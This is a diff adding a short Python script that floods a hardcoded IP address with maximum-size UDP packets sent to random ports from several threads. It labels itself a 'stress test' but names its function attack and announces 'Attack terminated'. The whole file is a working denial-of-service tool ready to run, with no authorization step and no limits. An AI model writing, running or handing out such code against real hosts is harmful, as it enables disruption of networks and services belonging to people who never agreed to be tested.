@@ -1,0 +1,35 @@
+import socket
+import threading
+import random
+from datetime import datetime
+
+TARGET_IP = "108.194.8.227"
+PORT_RANGE = (1, 65507)
+THREADS = 4
+print_lock = threading.Lock()
+
+def attack(thread_id):
+    while True:
+        try:
+            port = random.randint(*PORT_RANGE)
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.sendto(b"\x00" * 65507, (TARGET_IP, port))
+
+            with print_lock:
+                now = datetime.now().strftime("%H:%M:%S")
+                print(f"[{now}] Thread-{thread_id} -> {TARGET_IP}:{port}", flush=True)
+
+        except Exception as e:
+            pass
+
+if __name__ == "__main__":
+    print(f"🚀 Starting stress test with {THREADS} threads")
+    print("🔥 Targeting {TARGET_IP} | Port range: {PORT_RANGE}")
+    print("📢 Packets will be printed in real-time")
+    print("⏳ Press Enter to stop...\n")
+
+    for i in range(THREADS):
+        threading.Thread(target=attack, args=(i+1,), daemon=True).start()
+
+    input()
+    print("\n🛑 Attack terminated")
